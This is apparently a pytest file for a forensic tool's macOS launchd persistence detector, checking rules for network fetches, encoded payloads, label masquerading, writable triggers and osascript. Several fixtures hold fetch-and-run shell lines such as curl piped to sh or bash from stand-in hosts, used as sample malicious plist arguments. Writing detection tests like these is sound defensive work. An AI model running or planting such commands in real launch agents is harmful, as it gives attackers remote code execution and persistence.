"""macOS launchd plist deep-audit detector tests."""

from __future__ import annotations

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.macos_launchd import (
    MacosLaunchdDetector,
    _argv_to_str,
    _filename_label_match,
    _looks_writable,
)


# ---- helpers ---- #


def _make_launchd_artifact(
    path: str,
    label: str = "",
    *,
    program: str = "",
    program_arguments=None,
    run_at_load: bool = False,
    keep_alive: bool = False,
    watch_paths=None,
    queue_directories=None,
):
    return Artifact(
        collector="macos.launchd",
        category="persistence",
        subject=f"launchd:{path}",
        data={
            "path": path,
            "label": label,
            "program": program,
            "program_arguments": program_arguments,
            "run_at_load": run_at_load,
            "keep_alive": keep_alive,
            "watch_paths": watch_paths,
            "queue_directories": queue_directories,
            "mitre": "T1543.001",
        },
    )


def _seed(store, **kwargs):
    store.add_artifact(_make_launchd_artifact(**kwargs))


# ---- _argv_to_str ---- #


def test_argv_to_str_handles_list():
    assert _argv_to_str(["a", "b", "c"]) == "a b c"


def test_argv_to_str_handles_string():
    assert _argv_to_str("a b c") == "a b c"


def test_argv_to_str_handles_none():
    assert _argv_to_str(None) == ""


def test_argv_to_str_handles_int():
    assert _argv_to_str(42) == "42"


# ---- _looks_writable ---- #


def test_looks_writable_user_path():
    assert _looks_writable("/Users/alice/x.sh") is True
    assert _looks_writable("/Users/Shared/dropbox") is True
    assert _looks_writable("/tmp/staging") is True


def test_looks_writable_var_folders():
    assert _looks_writable("/private/var/folders/x/y/z") is True


def test_looks_writable_safe_paths():
    assert _looks_writable("/Library/Apple/x") is False
    assert _looks_writable("/System/Library/y") is False


def test_looks_writable_empty():
    assert _looks_writable("") is False


# ---- _filename_label_match ---- #


def test_filename_label_matches_stem():
    assert _filename_label_match(
        "/Library/LaunchDaemons/com.example.foo.plist",
        "com.example.foo",
    ) is True


def test_filename_label_case_insensitive():
    assert _filename_label_match(
        "/x/Com.Example.Foo.plist", "com.example.FOO",
    ) is True


def test_filename_label_mismatch():
    assert _filename_label_match(
        "/x/com.evil.malware.plist",
        "com.apple.softwareupdate",
    ) is False


def test_filename_label_missing_returns_true():
    """Missing either side = can't determine = no finding."""
    assert _filename_label_match("", "com.x") is True
    assert _filename_label_match("/x/y.plist", "") is True


# ---- detector: skip Apple system plists ---- #


def test_detector_skips_apple_system_plist(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/System/Library/LaunchDaemons/com.apple.foo.plist",
              label="com.apple.foo",
              program="/usr/sbin/bar",
              program_arguments=["/usr/sbin/bar", "--flag"])
        findings = list(MacosLaunchdDetector().detect(store))
        assert findings == []
    finally:
        store.close()


def test_detector_does_not_skip_non_apple_label_under_system(tmp_path):
    """If somehow a non-Apple label appears under /System/Library/,
    we still run checks — SIP bypass shape."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/System/Library/LaunchDaemons/com.evil.plist",
              label="com.evil.x",
              program_arguments=["/bin/sh", "-c",
                                 "curl https://e.com/x.sh | sh"])
        findings = list(MacosLaunchdDetector().detect(store))
        assert findings  # rules fired
    finally:
        store.close()


# ---- L1 network fetch ---- #


def test_detector_l1_curl_in_args_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.evilcorp.x.plist",
              label="com.evilcorp.x",
              program_arguments=["/bin/sh", "-c",
                                 "curl -o /tmp/x https://example.com/x"])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_detector_l1_pipe_to_shell_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.evil.x.plist",
              label="com.evil.x",
              program_arguments=["/bin/sh", "-c",
                                 "curl https://e.com/x | bash"])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "critical"
        assert f[0].evidence["pipe_to_shell"] is True
    finally:
        store.close()


def test_detector_l1_python_urllib(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.evil.x.plist",
              label="com.evil.x",
              program_arguments=["/usr/bin/python3", "-c",
                                 "import urllib.request"])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_network_fetch"]
        assert len(f) == 1
    finally:
        store.close()


# ---- L2 encoded payload ---- #


def test_detector_l2_base64_blob_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.evil.x.plist",
              label="com.evil.x",
              program_arguments=["/bin/sh", "-c",
                                 "echo " + ("A" * 200)])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_encoded_payload"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


def test_detector_l2_hex_blob(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.evil.x.plist",
              label="com.evil.x",
              program_arguments=["/bin/sh", "-c",
                                 r"echo " + (r"\x41" * 50)])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_encoded_payload"]
        assert len(f) == 1
    finally:
        store.close()


# ---- L3 label/filename mismatch ---- #


def test_detector_l3_label_mismatch_masquerade(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.evil.malware.plist",
              label="com.apple.softwareupdate",
              program="/Applications/x/x")
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_label_mismatch"]
        assert len(f) == 1
        assert f[0].severity == "medium"
        assert f[0].mitre == "T1036"
    finally:
        store.close()


def test_detector_l3_no_mismatch_when_label_matches(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.example.foo.plist",
              label="com.example.foo",
              program="/Applications/Foo/Foo")
        findings = list(MacosLaunchdDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "launchd_label_mismatch"]
    finally:
        store.close()


# ---- L4 writable trigger ---- #


def test_detector_l4_writable_watch_path_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/Applications/x",
              watch_paths=["/Users/alice/Drop"])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_writable_trigger"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_detector_l4_writable_queue_dir_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/Applications/x",
              queue_directories=["/tmp/queue"])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_writable_trigger"]
        assert len(f) == 1
    finally:
        store.close()


def test_detector_l4_no_finding_for_protected_watch_path(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/Applications/x",
              watch_paths=["/etc/foo.conf"])
        findings = list(MacosLaunchdDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "launchd_writable_trigger"]
    finally:
        store.close()


# ---- L5 empty label ---- #


def test_detector_l5_empty_label_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/x.plist",
              label="",
              program="/Applications/x")
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_empty_label"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


# ---- L6 interpreter + keepalive ---- #


def test_detector_l6_interpreter_keepalive_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/bin/sh",
              program_arguments=["/bin/sh", "/Users/x/loop.sh"],
              keep_alive=True)
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_interpreter_keepalive"]
        assert len(f) == 1
        assert f[0].severity == "high"
        assert f[0].mitre == "T1059.004"
    finally:
        store.close()


def test_detector_l6_no_finding_without_keepalive(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/bin/sh",
              program_arguments=["/bin/sh", "/Users/x/once.sh"],
              keep_alive=False)
        findings = list(MacosLaunchdDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "launchd_interpreter_keepalive"]
    finally:
        store.close()


def test_detector_l6_no_finding_for_binary_program(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/usr/local/bin/myapp",
              program_arguments=["/usr/local/bin/myapp"],
              keep_alive=True)
        findings = list(MacosLaunchdDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind")
                    == "launchd_interpreter_keepalive"]
    finally:
        store.close()


# ---- L7 osascript ---- #


def test_detector_l7_osascript_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed(store,
              path="/Library/LaunchDaemons/com.x.plist",
              label="com.x",
              program="/usr/bin/osascript",
              program_arguments=["/usr/bin/osascript", "/x/y.scpt"])
        findings = list(MacosLaunchdDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "launchd_osascript"]
        assert len(f) == 1
        assert f[0].severity == "medium"
        assert f[0].mitre == "T1059.002"
    finally:
        store.close()


# ---- detector: misc ---- #


def test_detector_returns_no_findings_on_empty_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        assert list(MacosLaunchdDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_ignores_non_launchd_artifacts(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="other.collector",
            category="persistence",
            subject="other:x",
            data={"path": "/x", "program_arguments": ["curl"]},
        ))
        assert list(MacosLaunchdDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_registered_in_all_detectors():
    from digger.detectors import all_detectors
    names = {d.name for d in all_detectors()}
    assert "macos_launchd" in names


def test_detector_sigma_template_has_persistence_tag():
    det = MacosLaunchdDetector()
    tpl = det.to_sigma_template()
    assert tpl["id"] == "digger-macos-launchd-template"
    assert "attack.t1543.001" in tpl["tags"]
    assert tpl["logsource"]["product"] == "macos"
